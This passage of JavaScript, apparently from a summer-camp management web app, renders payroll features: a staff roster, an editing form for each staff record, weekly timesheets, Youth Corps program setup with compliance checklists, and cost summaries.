                var patch={role:get(rows[r],iRole)||undefined,zelle_handle:get(rows[r],iZelle)||null,venmo_handle:get(rows[r],iVenmo)||null,paypal_handle:get(rows[r],iPaypal)||null,cashapp_handle:get(rows[r],iCash)||null};
                var key=name.toLowerCase(); var existing=byName[key];
                if(existing){
                    updated++;
                    ops.push(client.from('link_staff_accounts').update(patch).eq('id',existing.id).then(function(res){ if(!res.error)Object.assign(existing,res.data); }));
                }else{
                    added++;
                    var insertRow=Object.assign({camp_id:campId,staff_name:name},patch,{role:patch.role||''});
                    ops.push(client.from('link_staff_accounts').insert(insertRow).select().single().then(function(res){ if(!res.error&&res.data){ if(!_ptAccounts)_ptAccounts=[]; _ptAccounts.push(res.data); } }));
                }
            }
            Promise.all(ops).then(function(){ renderPayroll(); toast('Imported — '+added+' added, '+updated+' updated'); });
        }catch(e){ console.warn('[Me] Tip payments CSV import failed:',e); toast('Could not read that file — make sure it\'s the CSV template','error'); }
    };
    reader.readAsText(file);
}

// ── Overview ─────────────────────────────────────────────────────
function _prOverview(){
    var core=PC(),today=_prToday();
    var seasonCost=core.seasonCost(payroll.staff,{weeks:7});
    var corps=_prCorpsStaff();
    var programPaid=payroll.staff.filter(function(s){return s.payType==='program'}).length;

    // Anything outstanding across every Youth Corps participant.
    var blockers=0,warnings=0;
    corps.forEach(function(s){
        var r=core.participantChecklist(s,payroll.youthCorps,today);
        blockers+=r.blockers.length; warnings+=r.warnings.length;
    });

    var h='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">';
    h+=_prStat('On Payroll',payroll.staff.length+'',programPaid?programPaid+' paid by a program':'','var(--me)');
    h+=_prStat('Camp Season Cost',fm(seasonCost),'Excludes program-paid staff','#3B82F6');
    h+=_prStat('Youth Corps',corps.length+'','Participants enrolled','#8B5CF6');
    h+=_prStat('Compliance',blockers?blockers+' blocking':(warnings?warnings+' to chase':'All clear'),
        blockers?'Cannot start work':(warnings?'Missing paperwork':''),
        blockers?'var(--err)':(warnings?'var(--me)':'var(--ok)'));
    h+='</div>';

    if(!payroll.staff.length){
        return h+_prEmpty('No one on payroll yet. Add your staff to track pay, hours and Youth Corps paperwork.',
            '<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.prEditStaff()">+ Add Staff</button>');
    }

    // Whatever is actually blocking someone from starting.
    var rows=[];
    corps.forEach(function(s){
        var r=core.participantChecklist(s,payroll.youthCorps,today);
        r.blockers.concat(r.warnings).forEach(function(i){
            rows.push({name:s.name,label:i.label,detail:i.detail,sev:i.severity,id:s.id});
        });
    });
    if(rows.length){
        h+='<div class="me-card" style="margin-bottom:14px"><div class="me-card-head"><h3>Needs attention</h3></div>';
        h+='<div class="me-tw"><table class="me-t"><thead><tr><th>Who</th><th>Item</th><th>Detail</th><th></th></tr></thead><tbody>';
        rows.slice(0,20).forEach(function(r){
            h+='<tr><td class="bold">'+esc(r.name)+'</td><td>'+esc(r.label)+'</td>'+
               '<td style="font-size:.78rem;color:var(--s500)">'+esc(r.detail)+'</td>'+
               '<td style="text-align:right">'+(r.sev==='blocker'?bdg('Blocking','err'):bdg('Chase','warn'))+'</td></tr>';
        });
        h+='</tbody></table></div>';
        if(rows.length>20) h+='<div style="padding:8px 14px;font-size:.76rem;color:var(--s400)">+ '+(rows.length-20)+' more</div>';
        h+='</div>';
    }

    // Cost by pay type, so a camp can see where the money goes.
    var byType={};
    payroll.staff.forEach(function(s){
        var t=(s.payType||'hourly');
        byType[t]=(byType[t]||0)+core.seasonCost([s],{weeks:7});
    });
    var items=Object.keys(byType).map(function(k){
        var m=core.PAY_TYPES.filter(function(p){return p.id===k})[0];
        return{name:m?m.label:k,value:byType[k]};
    }).sort(function(a,b){return b.value-a.value});
    if(items.length){
        h+='<div class="me-card" style="padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 10px">Season Cost by Pay Type</h4>';
        var mx=items[0].value||1;
        items.forEach(function(it,i){
            var pct=mx>0?Math.round(it.value/mx*100):0;
            var col=BAR_COLORS[i%BAR_COLORS.length];
            h+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><div style="width:110px;font-size:.75rem;font-weight:600;color:var(--s500);text-align:right">'+esc(it.name)+'</div>'+
               '<div style="flex:1;height:20px;background:var(--s100);border-radius:4px;overflow:hidden"><div style="width:'+pct+'%;height:100%;background:'+col+';border-radius:4px"></div></div>'+
               '<div style="width:70px;font-size:.75rem;font-weight:700;color:var(--s700);text-align:right">'+fm(it.value)+'</div></div>';
        });
        h+='</div>';
    }
    return h;
}

// ── Staff tab ────────────────────────────────────────────────────
function _prStaffTab(){
    var core=PC(),today=_prToday();
    if(!payroll.staff.length){
        return _prEmpty('No payroll records yet.',
            '<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.prEditStaff()">+ Add Staff</button>');
    }
    var h='<div class="me-card"><div class="me-card-head"><h3>Payroll Roster</h3><span style="font-size:.75rem;color:var(--s400)">'+payroll.staff.length+' people</span></div>';
    h+='<div class="me-tw"><table class="me-t"><thead><tr><th>Name</th><th>Role</th><th>Age</th><th>Pay</th><th>Paid by</th><th>Youth Corps</th><th>Docs</th><th></th></tr></thead><tbody>';
    payroll.staff.slice().sort(function(a,b){return String(a.name||'').localeCompare(String(b.name||''))}).forEach(function(s){
        var age=core.ageOn(s.dob,today);
        var pt=core.PAY_TYPES.filter(function(p){return p.id===(s.payType||'hourly')})[0];
        var pay=pt?pt.label:'Hourly';
        var rate=parseFloat(s.payRate)||0;
        var payStr=s.payType==='hourly'||s.payType==='program'?fm(rate)+'/hr':fm(rate);
        var corps='';
        if(s.youthCorps&&s.youthCorps.enrolled){
            var r=core.participantChecklist(s,payroll.youthCorps,today);
            corps=r.blockers.length?bdg(r.blockers.length+' blocking','err')
                 :r.warnings.length?bdg(r.warnings.length+' to chase','warn')
                 :bdg('Cleared','ok');
        }else corps='<span style="color:var(--s300)">—</span>';
        var docs=[];
        if(s.i9OnFile)docs.push('I-9'); if(s.w4OnFile)docs.push('W-4');
        if(s.youthCorps&&s.youthCorps.workingPapers)docs.push('Papers');
        h+='<tr class="click" onclick="CampistryMe.prEditStaff('+s.id+')">'+
            '<td class="bold">'+esc(s.name||'')+'</td>'+
            '<td>'+esc(s.role||'')+'</td>'+
            '<td>'+(age==null?'<span style="color:var(--s300)">—</span>':(age<18?'<span style="color:var(--me);font-weight:600">'+age+'</span>':age))+'</td>'+
            '<td>'+esc(pay)+'<div style="font-size:.72rem;color:var(--s400)">'+payStr+'</div></td>'+
            '<td style="font-size:.78rem">'+esc(core.payMethodLabel(s.paymentMethod))+'</td>'+
            '<td>'+corps+'</td>'+
            '<td style="font-size:.74rem;color:var(--s500)">'+(docs.length?esc(docs.join(' · ')):'—')+'</td>'+
            '<td style="text-align:right" onclick="event.stopPropagation()"><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.prRemoveStaff('+s.id+')">✕</button></td></tr>';
    });
    h+='</tbody></table></div></div>';
    return h;
}

/** One address block (home or summer). */
function _prAddrFields(prefix,addr,label){
    addr=addr||{};
    var h='<div class="fsec">'+esc(label)+'</div>';
    h+=ff('Street Address',prefix+'Street',addr.street||'');
    h+='<div class="fr">'+ff('City',prefix+'City',addr.city||'')+ff('State',prefix+'State',addr.state||'')+ff('ZIP',prefix+'Zip',addr.zip||'')+'</div>';
    return h;
}
function _prReadAddr(prefix){
    function v(id){var e=document.getElementById(id);return e?(e.value||'').trim():''}
    return{street:v(prefix+'Street'),city:v(prefix+'City'),state:v(prefix+'State'),zip:v(prefix+'Zip')};
}

function prEditStaff(id){
    var core=PC(); if(!core) return;
    var editing=(id!=null);
    var s=editing?(_prStaffById(id)||{}):{};
    var yc=s.youthCorps||{};
    var today=_prToday();

    var h='<div class="fsec">Person</div>';
    h+='<div class="fr">'+ff('Full Name','prName',s.name||'')+ff('Role / Title','prRole',s.role||'')+'</div>';
    h+='<div class="fr">'+ff('Date of Birth','prDob',s.dob||'','date')+ff('Department','prDept',s.department||'')+'</div>';
    h+='<div class="fr">'+ff('Phone','prPhone',s.phone||'','tel')+ff('Email','prEmail',s.email||'','email')+'</div>';
    h+='<div class="fr">'+ff('Bunk / Assignment','prBunk',s.bunk||'','select',[''].concat(_allBunkNames()))+
        ff('Employment','prType',s.employmentType||'seasonal','select',['seasonal','annual'])+'</div>';
    h+='<div class="fr">'+ff('Start Date','prStart',s.startDate||'','date')+ff('End Date','prEnd',s.endDate||'','date')+'</div>';
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer">'+
        '<input type="checkbox" id="prCounselor"'+(s.isCampCounselor!==false?' checked':'')+'> '+
        'Works as a counselor / junior counselor / CIT</label>'+
        '<p style="font-size:.68rem;color:var(--s400);margin:2px 0 0">New York exempts a 17-year-old in this role from hour limits during June, July and August.</p></div>';

    // Addresses — home is the payroll address of record; summer is where they
    // actually are during the season. They are almost never the same.
    h+=_prAddrFields('prHome',s.homeAddress,'Home Address');
    var same=!!s.summerAddressSameAsHome;
    h+='<div class="fsec">Summer Address</div>';
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer">'+
        '<input type="checkbox" id="prSummerSame"'+(same?' checked':'')+' onchange="CampistryMe.prToggleSummer()"> Same as home address</label></div>';
    h+='<div id="prSummerBlock" style="'+(same?'display:none':'')+'">';
    h+=ff('Street Address','prSummerStreet',(s.summerAddress||{}).street||'');
    h+='<div class="fr">'+ff('City','prSummerCity',(s.summerAddress||{}).city||'')+ff('State','prSummerState',(s.summerAddress||{}).state||'')+ff('ZIP','prSummerZip',(s.summerAddress||{}).zip||'')+'</div>';
    h+='</div>';

    h+='<div class="fsec">Pay</div>';
    h+='<div class="fr"><div class="fg"><label class="fl">Pay Type</label><select id="prPayType" class="fs" onchange="CampistryMe.prPayTypeHint()">'+
        core.PAY_TYPES.map(function(p){return'<option value="'+esc(p.id)+'"'+((s.payType||'hourly')===p.id?' selected':'')+'>'+esc(p.label)+'</option>'}).join('')+
        '</select></div>'+
        '<div class="fg"><label class="fl" id="prRateLbl">Rate</label><input type="number" min="0" step="0.01" id="prRate" class="fi" value="'+(s.payRate||'')+'"></div></div>';
    h+='<div class="fr">'+ff('Expected hours / week','prHours',s.expectedWeeklyHours||'','number')+ff('Weeks in season','prWeeks',s.seasonWeeks||'','number')+'</div>';
    h+='<div class="fg"><label class="fl">Paid by</label><select id="prMethod" class="fs">'+
        core.PAY_METHODS.map(function(m){return'<option value="'+esc(m.id)+'"'+(s.paymentMethod===m.id?' selected':'')+'>'+esc(m.label)+'</option>'}).join('')+
        '</select><p style="font-size:.68rem;color:var(--s400);margin:2px 0 0">Direct deposit, check, or a payroll card — the same card the program issues.</p></div>';

    h+='<div class="fsec">Documents on File</div>';
    h+='<div style="display:flex;gap:16px;flex-wrap:wrap;margin-bottom:8px">'+
        '<label class="fl" style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="prI9"'+(s.i9OnFile?' checked':'')+'> I-9</label>'+
        '<label class="fl" style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="prW4"'+(s.w4OnFile?' checked':'')+'> W-4</label>'+
        '<label class="fl" style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="prBg"'+(s.backgroundCheck?' checked':'')+'> Background check</label>'+
        '</div>';

    // ── Youth Corps ──
    h+='<div class="fsec">Youth Corps</div>';
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer">'+
        '<input type="checkbox" id="prYcOn"'+(yc.enrolled?' checked':'')+' onchange="CampistryMe.prToggleYc()"> Enrolled in a Youth Corps / summer youth employment program</label></div>';
    h+='<div id="prYcBlock" style="'+(yc.enrolled?'':'display:none')+'">';
    h+='<div class="fr">'+ff('Participant ID','prYcId',yc.participantId||'')+ff('Site supervisor','prYcSup',yc.supervisorName||'')+'</div>';
    h+='<div class="fr">'+ff('Orientation completed','prYcOrient',yc.orientationDate||'','date')+
        '<div class="fg"><label class="fl">Paid by</label><select id="prYcPay" class="fs">'+
        ['']. concat(core.PAY_METHODS.map(function(m){return m.id})).map(function(id){
            var lbl=id?core.payMethodLabel(id):'—';
            return'<option value="'+esc(id)+'"'+(yc.paymentMethod===id?' selected':'')+'>'+esc(lbl)+'</option>';
        }).join('')+'</select></div></div>';
    h+='<div style="display:flex;gap:16px;flex-wrap:wrap;margin-bottom:8px">'+
        '<label class="fl" style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="prYcPapers"'+(yc.workingPapers?' checked':'')+'> Working papers on file</label>'+
        '<label class="fl" style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="prYcPhys"'+(yc.physicalOnFile?' checked':'')+'> Physical certificate on file</label>'+
        '</div>';
    h+=ff('Working papers expire','prYcExp',yc.workingPapersExpiry||'','date');
    h+='</div>';

    // Live compliance readout for an existing record.
    if(editing&&yc.enrolled){
        h+='<div class="fsec">Compliance</div>'+_prChecklistHtml(core.participantChecklist(s,payroll.youthCorps,today));
    }

    showModal(editing?'Edit Payroll Record':'Add to Payroll',h,function(){
        function v(id){var e=document.getElementById(id);return e?(e.value||'').trim():''}
        function chk(id){var e=document.getElementById(id);return !!(e&&e.checked)}
        var name=v('prName');
        if(!name){toast('Name is required','error');return}
        var summerSame=chk('prSummerSame');
        var rec={
            id:editing?s.id:payroll.nextStaffId++,
            name:name, role:v('prRole'), department:v('prDept'),
            dob:v('prDob'), phone:v('prPhone'), email:v('prEmail'),
            bunk:v('prBunk'), employmentType:v('prType')||'seasonal',
            startDate:v('prStart'), endDate:v('prEnd'),
            isCampCounselor:chk('prCounselor'),
            homeAddress:_prReadAddr('prHome'),
            summerAddressSameAsHome:summerSame,
            summerAddress:summerSame?_prReadAddr('prHome'):_prReadAddr('prSummer'),
            payType:v('prPayType')||'hourly',
            payRate:parseFloat(v('prRate'))||0,
            expectedWeeklyHours:parseFloat(v('prHours'))||0,
            seasonWeeks:parseFloat(v('prWeeks'))||0,
            paymentMethod:v('prMethod'),
            i9OnFile:chk('prI9'), w4OnFile:chk('prW4'), backgroundCheck:chk('prBg'),
            youthCorps:{
                enrolled:chk('prYcOn'),
                participantId:v('prYcId'),
                supervisorName:v('prYcSup'),
                orientationDate:v('prYcOrient'),
                paymentMethod:v('prYcPay'),
                workingPapers:chk('prYcPapers'),
                physicalOnFile:chk('prYcPhys'),
                workingPapersExpiry:v('prYcExp')
            }
        };
        if(editing){
            var idx=payroll.staff.findIndex(function(x){return String(x.id)===String(s.id)});
            if(idx>=0)payroll.staff[idx]=Object.assign({},s,rec);
        }else payroll.staff.push(rec);
        closeModal('dynModal');
        save(); renderPayroll();
        toast(editing?'Payroll record updated':'Added to payroll');
    });
    prPayTypeHint();
}
function prToggleSummer(){
    var on=document.getElementById('prSummerSame'), b=document.getElementById('prSummerBlock');
    if(b)b.style.display=(on&&on.checked)?'none':'';
}
function prToggleYc(){
    var on=document.getElementById('prYcOn'), b=document.getElementById('prYcBlock');
    if(b)b.style.display=(on&&on.checked)?'':'none';
}
function prPayTypeHint(){
    var core=PC(); if(!core)return;
    var sel=document.getElementById('prPayType'), lbl=document.getElementById('prRateLbl');
    if(!sel||!lbl)return;
    var t=core.PAY_TYPES.filter(function(p){return p.id===sel.value})[0];
    lbl.textContent=t?t.rateLabel:'Rate';
}
async function prRemoveStaff(id){
    var s=_prStaffById(id); if(!s)return;
    var ok=await confirmDialog({title:'Remove from Payroll?',message:'<strong>'+esc(s.name||'This person')+'</strong> will be removed from payroll. Their timesheets are removed too.',confirmLabel:'Remove',danger:true});
    if(!ok)return;
    payroll.staff=payroll.staff.filter(function(x){return String(x.id)!==String(id)});
    payroll.timesheets=payroll.timesheets.filter(function(t){return String(t.staffId)!==String(id)});
    save(); renderPayroll(); toast('Removed from payroll');
}

function _prChecklistHtml(res){
    var h='<div style="border:1px solid var(--s200);border-radius:var(--r);overflow:hidden">';
    res.items.forEach(function(i){
        var icon=i.ok===true?'<span style="color:var(--ok)">✓</span>'
                :i.ok===false?'<span style="color:'+(i.severity==='blocker'?'var(--err)':'var(--me)')+'">'+(i.severity==='blocker'?'✕':'!')+'</span>'
                :'<span style="color:var(--s300)">?</span>';
        h+='<div style="display:flex;align-items:flex-start;gap:9px;padding:7px 12px;border-bottom:1px solid var(--s100)">'+
            '<div style="width:14px;flex-shrink:0;font-weight:700">'+icon+'</div>'+
            '<div style="flex:1;min-width:0"><div style="font-size:.8rem;font-weight:600;color:var(--s700)">'+esc(i.label)+'</div>'+
            (i.detail?'<div style="font-size:.72rem;color:var(--s400)">'+esc(i.detail)+'</div>':'')+'</div></div>';
    });
    h+='</div>';
    return h;
}

// ── Timesheets ───────────────────────────────────────────────────
function prWeekStep(n){ _prWeek=_prShiftWeek(_prWeek||_prWeekStart(),n); renderPayroll() }
function prWeekToday(){ _prWeek=_prWeekStart(); renderPayroll() }

function _prTimesheetsTab(){
    var core=PC(),today=_prToday();
    if(!payroll.staff.length) return _prEmpty('Add staff before logging hours.');

    var weekEnd=_prShiftWeek(_prWeek,0);
    var p=weekEnd.split('-'); var endD=new Date(+p[0],+p[1]-1,+p[2]); endD.setDate(endD.getDate()+6);
    var endStr=endD.toLocaleDateString('en-US',{month:'short',day:'numeric'});
    var startStr=new Date(+p[0],+p[1]-1,+p[2]).toLocaleDateString('en-US',{month:'short',day:'numeric'});

    var h='<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:12px">'+
        '<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.prWeekStep(-1)">‹ Prev week</button>'+
        '<div style="font-weight:700;font-size:.9rem;color:var(--s700)">'+esc(startStr)+' – '+esc(endStr)+'</div>'+
        '<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.prWeekStep(1)">Next week ›</button>'+
        '<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.prWeekToday()">This week</button>'+
        '</div>';

    h+='<div class="me-card"><div class="me-card-head"><h3>Hours — week of '+esc(_prWeek)+'</h3></div>';
    h+='<div class="me-tw"><table class="me-t"><thead><tr><th>Name</th>'+
        core.DAY_KEYS.map(function(k){return'<th style="text-align:center">'+core.DAY_LABELS[k]+'</th>'}).join('')+
        '<th style="text-align:center">Total</th><th>Signed</th><th>Status</th><th>Flags</th></tr></thead><tbody>';

    payroll.staff.slice().sort(function(a,b){return String(a.name||'').localeCompare(String(b.name||''))}).forEach(function(s){
        var sheet=_prSheet(s.id,_prWeek)||{staffId:s.id,weekOf:_prWeek,days:{},status:'draft',supervisorSigned:false};
        var chk=core.checkTimesheet(sheet,s,{program:payroll.youthCorps,today:today});
        h+='<tr><td class="bold">'+esc(s.name||'')+(s.youthCorps&&s.youthCorps.enrolled?' <span style="font-size:.65rem;color:#8B5CF6;font-weight:700">YC</span>':'')+'</td>';
        core.DAY_KEYS.forEach(function(k){
            var v=(sheet.days&&sheet.days[k]!=null)?sheet.days[k]:'';
            h+='<td style="text-align:center;padding:2px"><input type="number" min="0" max="24" step="0.25" value="'+esc(String(v))+'" '+
               'style="width:52px;padding:4px;text-align:center;border:1px solid var(--s200);border-radius:5px;font-size:.78rem" '+
               'onchange="CampistryMe.prSetHours('+s.id+',\''+k+'\',this.value)"></td>';
        });
        h+='<td style="text-align:center;font-weight:700">'+chk.total+'</td>';
        h+='<td><label style="cursor:pointer"><input type="checkbox"'+(sheet.supervisorSigned?' checked':'')+' onchange="CampistryMe.prSetSigned('+s.id+',this.checked)"></label></td>';
        h+='<td><select class="fs" style="font-size:.74rem;padding:3px 6px" onchange="CampistryMe.prSetSheetStatus('+s.id+',this.value)">'+
            ['draft','submitted','approved'].map(function(st){return'<option value="'+st+'"'+((sheet.status||'draft')===st?' selected':'')+'>'+st.charAt(0).toUpperCase()+st.slice(1)+'</option>'}).join('')+
            '</select></td>';
        h+='<td style="font-size:.72rem">'+(chk.issues.length
            ? chk.issues.map(function(i){return'<div style="color:'+(i.severity==='blocker'?'var(--err)':'var(--me)')+'">'+esc(i.message)+'</div>'}).join('')
            : '<span style="color:var(--ok)">✓</span>')+'</td>';
        h+='</tr>';
    });
    h+='</tbody></table></div></div>';
    h+='<p style="font-size:.72rem;color:var(--s400);margin-top:8px">Hour limits are New York\'s, and the program cap comes from the Youth Corps tab. A 17-year-old counselor is exempt from hour limits in June, July and August.</p>';
    return h;
}

/** Get (creating if needed) the sheet for a person + the open week. */
function _prEnsureSheet(staffId){
    var sh=_prSheet(staffId,_prWeek);
    if(!sh){
        sh={staffId:staffId,weekOf:_prWeek,days:{},status:'draft',supervisorSigned:false};
        payroll.timesheets.push(sh);
    }
    if(!sh.days)sh.days={};
    return sh;
}
function prSetHours(staffId,day,val){
    var n=parseFloat(val);
    var sh=_prEnsureSheet(staffId);
    if(!isFinite(n)||n<=0) delete sh.days[day];
    else sh.days[day]=Math.min(24,n);
    save(); renderPayroll();
}
function prSetSigned(staffId,on){ _prEnsureSheet(staffId).supervisorSigned=!!on; save(); renderPayroll() }
function prSetSheetStatus(staffId,st){ _prEnsureSheet(staffId).status=st; save(); renderPayroll() }

// ── Youth Corps ──────────────────────────────────────────────────
function _prYouthTab(){
    var core=PC(),today=_prToday();
    var prog=core.youthCorpsSettings(payroll.youthCorps);
    var corps=_prCorpsStaff();
    var progRes=core.programChecklist(prog,corps);

    var h='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">';
    h+=_prStat('Participants',corps.length+'','','#8B5CF6');
    h+=_prStat('Weekly Cap',prog.maxWeeklyHours+' h','Per participant','var(--me)');
    h+=_prStat('Supervisors',progRes.supervisorCount+' / '+Math.max(1,progRes.supervisorsNeeded),'1 per '+prog.supervisorRatioMax+' youth',
        progRes.supervisorCount>=progRes.supervisorsNeeded?'var(--ok)':'var(--err)');
    h+=_prStat('Program Weeks',prog.programWeeks+'','','#0EA5E9');
    h+='</div>';

    // What Youth Corps actually is, in the app, once — so the office isn't
    // guessing what the fields below are for.
    h+='<div class="me-card" style="padding:14px 16px;margin-bottom:14px;background:#F8FAFC">'+
        '<h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 6px">How this works</h4>'+
        '<p style="font-size:.78rem;color:var(--s500);line-height:1.6;margin:0">'+
        'When teenage staff come through a Youth Corps or summer youth employment program, the camp is a <strong>worksite</strong> — the program employs and pays them, and you host and supervise. '+
        'That means their pay may not appear in your payroll total at all, their hours are capped by the program on top of state limits, and weekly timesheets have to be signed by the site supervisor and submitted by the program\'s cutoff or the week goes unpaid. '+
        'Fill in the program details below and Campistry will check each participant\'s paperwork and hours against them.</p></div>';

    h+='<div class="me-card" style="margin-bottom:14px"><div class="me-card-head"><h3>Program Setup</h3>'+
        '<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.prEditProgram()">Edit</button></div>';
    h+='<div style="padding:14px 16px;display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:12px">';
    function fld(l,v){return'<div><div style="font-size:.66rem;font-weight:700;color:var(--s400);text-transform:uppercase;letter-spacing:.04em">'+esc(l)+'</div>'+
        '<div style="font-size:.85rem;color:var(--s700);font-weight:600;margin-top:2px">'+(v?esc(v):'<span style="color:var(--s300);font-weight:400">Not set</span>')+'</div></div>'}
    h+=fld('Program',prog.programName);
    h+=fld('Worksite',prog.worksiteName);
    h+=fld('Worksite ID',prog.worksiteId);
    h+=fld('Coordinator',prog.coordinatorName);
    h+=fld('Coordinator contact',prog.coordinatorPhone||prog.coordinatorEmail);
    h+=fld('Default supervisor',prog.supervisorName);
    h+=fld('Dates',prog.startDate&&prog.endDate?prog.startDate+' → '+prog.endDate:'');
    h+=fld('Eligible ages',prog.minAge+'–'+prog.maxAge);
    h+=fld('Timesheet due',_prDayName(prog.timesheetDueDay));
    h+=fld('Payroll commits',_prDayName(prog.payrollCommitDay));
    h+='</div></div>';

    h+='<div class="me-card" style="margin-bottom:14px"><div class="me-card-head"><h3>Program Checklist</h3></div>'+
        '<div style="padding:0">'+_prChecklistHtml(progRes)+'</div></div>';

    if(!corps.length){
        h+=_prEmpty('No participants enrolled yet. Open a payroll record and tick "Enrolled in a Youth Corps" to add one.',
            '<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.prEditStaff()">+ Add Staff</button>');
        return h;
    }

    h+='<div class="me-card"><div class="me-card-head"><h3>Participants</h3></div>';
    h+='<div class="me-tw"><table class="me-t"><thead><tr><th>Name</th><th>Age</th><th>Participant ID</th><th>Supervisor</th><th>Papers</th><th>Orientation</th><th>Status</th></tr></thead><tbody>';
    corps.slice().sort(function(a,b){return String(a.name||'').localeCompare(String(b.name||''))}).forEach(function(s){
        var r=core.participantChecklist(s,prog,today);
        var yc=s.youthCorps||{};
        var status=r.blockers.length?bdg('Not cleared','err'):(r.warnings.length?bdg('Missing docs','warn'):bdg('Cleared','ok'));
        h+='<tr class="click" onclick="CampistryMe.prEditStaff('+s.id+')">'+
            '<td class="bold">'+esc(s.name||'')+'</td>'+
            '<td>'+(r.age==null?'—':r.age)+'</td>'+
            '<td style="font-family:monospace;font-size:.78rem">'+esc(yc.participantId||'—')+'</td>'+
            '<td>'+esc(yc.supervisorName||prog.supervisorName||'—')+'</td>'+
            '<td>'+(yc.workingPapers?'<span style="color:var(--ok)">✓</span>'+(yc.workingPapersExpiry?' <span style="font-size:.7rem;color:var(--s400)">to '+esc(yc.workingPapersExpiry)+'</span>':''):'<span style="color:var(--err)">✕</span>')+'</td>'+
            '<td>'+(yc.orientationDate?esc(yc.orientationDate):'<span style="color:var(--err)">✕</span>')+'</td>'+
            '<td>'+status+'</td></tr>';
    });
    h+='</tbody></table></div></div>';
    return h;
}
function _prDayName(n){ return['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'][n]||'—' }

function prEditProgram(){
    var core=PC(); if(!core)return;
    var p=core.youthCorpsSettings(payroll.youthCorps);
    var days=['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
    var h='<div class="fsec">Program</div>';
    h+='<div class="fr">'+ff('Program name','pgName',p.programName)+ff('Worksite name','pgSite',p.worksiteName)+'</div>';
    h+='<div class="fr">'+ff('Worksite ID','pgSiteId',p.worksiteId)+ff('Default site supervisor','pgSup',p.supervisorName)+'</div>';
    h+='<div class="fsec">Program Coordinator</div>';
    h+='<div class="fr">'+ff('Name','pgCoord',p.coordinatorName)+ff('Phone','pgCoordPh',p.coordinatorPhone,'tel')+'</div>';
    h+=ff('Email','pgCoordEm',p.coordinatorEmail,'email');
    h+='<div class="fsec">Dates &amp; Hours</div>';
    h+='<div class="fr">'+ff('Start date','pgStart',p.startDate,'date')+ff('End date','pgEnd',p.endDate,'date')+'</div>';
    h+='<div class="fr">'+ff('Max hours / week','pgMaxHrs',p.maxWeeklyHours,'number')+ff('Program weeks','pgWeeks',p.programWeeks,'number')+'</div>';
    h+='<div class="fr"><div class="fg"><label class="fl">Timesheets due</label><select id="pgDue" class="fs">'+
        days.map(function(d,i){return'<option value="'+i+'"'+(p.timesheetDueDay===i?' selected':'')+'>'+d+'</option>'}).join('')+'</select></div>'+
        '<div class="fg"><label class="fl">Payroll commits</label><select id="pgCommit" class="fs">'+
        days.map(function(d,i){return'<option value="'+i+'"'+(p.payrollCommitDay===i?' selected':'')+'>'+d+'</option>'}).join('')+'</select></div></div>';
    h+='<div class="fsec">Eligibility &amp; Supervision</div>';
    h+='<div class="fr">'+ff('Minimum age','pgMinAge',p.minAge,'number')+ff('Maximum age','pgMaxAge',p.maxAge,'number')+'</div>';
    h+='<div class="fr">'+ff('Max youth per supervisor','pgRatio',p.supervisorRatioMax,'number')+ff('Orientation hours','pgOrient',p.orientationHours,'number')+'</div>';
    h+='<p style="font-size:.68rem;color:var(--s400);margin:4px 0 0">Defaults follow the common summer-youth-employment shape: 25 hours a week for six weeks, one supervisor per fifteen youth, and an eight-hour orientation before placement. Change them to match your program\'s agreement.</p>';

    showModal('Youth Corps Program',h,function(){
        function v(id){var e=document.getElementById(id);return e?(e.value||'').trim():''}
        function n(id,d){var x=parseFloat(v(id));return isFinite(x)?x:d}
        payroll.youthCorps=core.youthCorpsSettings({
            programName:v('pgName'), worksiteName:v('pgSite'), worksiteId:v('pgSiteId'),
            supervisorName:v('pgSup'),
            coordinatorName:v('pgCoord'), coordinatorPhone:v('pgCoordPh'), coordinatorEmail:v('pgCoordEm'),
            startDate:v('pgStart'), endDate:v('pgEnd'),
            maxWeeklyHours:n('pgMaxHrs',25), programWeeks:n('pgWeeks',6),
            timesheetDueDay:n('pgDue',4), payrollCommitDay:n('pgCommit',2),
            minAge:n('pgMinAge',14), maxAge:n('pgMaxAge',24),
            supervisorRatioMax:n('pgRatio',15), orientationHours:n('pgOrient',8)
        });
        closeModal('dynModal');
        save(); renderPayroll(); toast('Program saved');
    });
}

// ── Pay runs ─────────────────────────────────────────────────────
function _prRunsTab(){
    var core=PC();
    var h='<div style="display:flex;justify-content:flex-end;margin-bottom:10px">'+
        '<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.prNewRun()">+ New Pay Run</button></div>';
    if(!payroll.payRuns.length){
        return h+_prEmpty('No pay runs yet. A pay run rolls up the timesheets in a date range into what each person is owed.');
    }
    payroll.payRuns.slice().sort(function(a,b){return String(b.to||'').localeCompare(String(a.to||''))}).forEach(function(run){
        h+='<div class="me-card" style="margin-bottom:12px"><div class="me-card-head">'+
            '<h3>'+esc(run.from||'')+' → '+esc(run.to||'')+'</h3>'+
            '<div style="display:flex;gap:8px;align-items:center">'+
            '<span style="font-size:.8rem;font-weight:700;color:var(--s700)">'+fm(run.campTotal||0)+'</span>'+
